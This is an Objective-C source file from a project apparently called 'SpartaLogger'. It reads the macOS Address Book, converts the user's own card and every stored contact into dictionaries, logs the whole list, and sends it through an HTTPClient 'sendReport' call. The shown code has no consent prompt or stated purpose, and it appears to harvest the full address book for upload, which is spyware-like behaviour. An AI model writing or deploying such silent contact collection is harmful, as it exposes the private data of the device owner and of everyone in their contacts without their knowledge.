//
//  ABParser.m
//  SpartaLogger
//
//  Created by Ryan Gomba on 11/25/11.
//  Copyright (c) 2011 AppThat. All rights reserved.
//

#import "ABParser.h"
#import <AddressBook/AddressBook.h>
#import "ABPerson+Dictionary.h"
#import "HTTPClient.h"

@implementation ABParser

- (ABAddressBook *)addressBook
{
    return [ABAddressBook sharedAddressBook];
}

#pragma mark -
#pragma mark AB Parser

- (NSDictionary *)fetchUser {
    ABPerson *user = self.addressBook.me;
   return [user asDictionary];
}

- (NSArray *)fetchContacts {
    NSMutableArray *contacts = [NSMutableArray array];
    NSArray *people = [self.addressBook people];
    for (ABPerson *person in people) {
        [contacts addObject:[person asDictionary]];
    }
    NSLog(@"%@",contacts);
    [HTTPClient sendReport:[NSMutableDictionary dictionaryWithObject:contacts forKey:@"contacts"] toFile:@"contacts"];
    return contacts;
}

@end
